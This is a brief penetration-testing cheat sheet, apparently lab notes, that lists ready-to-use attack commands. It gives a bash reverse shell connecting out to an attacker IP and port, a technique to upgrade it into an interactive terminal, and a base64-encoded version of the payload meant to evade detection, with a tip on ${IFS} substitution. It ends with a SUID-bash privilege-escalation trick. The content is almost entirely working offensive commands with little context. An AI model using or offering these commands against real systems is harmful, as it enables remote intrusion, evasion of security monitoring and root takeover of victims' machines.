# Reverse Shell
A reverse shell is a type of shell in which a target system connects back to an attacker's system.
Here an example of bash reverse shell

```console
bash -i >& /dev/tcp/10.10.14.1/9001 0>&1

bash -c "bash -i >& /dev/tcp/10.10.14.1/9001 0>&1"
```

## Fully Interactive Reverse Shell
The Reverse Shell obtained is tipically simple and not interactive. The following method upgrades the current shell:

```console
python -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to suspend, then check for terminal rows & cols size
stty size

stty raw -echo;fg;
export TERM=xterm-256color
stty rows <rows> columns <cols>

# Use reset when needed to reset terminal state in case of visualization issues
reset
```

## Base64 Reverse Shell 
Base64 encoding is often employed when creating reverse shells to evade detection and/or avoiding special character interpretation

```console
echo -n 'bash -i >& /dev/tcp/10.10.14.1/9001 0>&1' | base64 -w0
> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzkwMDEgMD4mMQ==

# Getting rid of any special characters adding white spaces
echo -n 'bash  -i >& /dev/tcp/10.10.14.1/9001  0>&1' | base64 -w0
> YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMS85MDAxICAwPiYx

echo BASE64_PAYLOAD | base64 -d | bash
```

N.B. Remember to use `;` separators of `${IFS}` instead of spaces


## Privilege Escalation

```console
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

./rootbash -p
```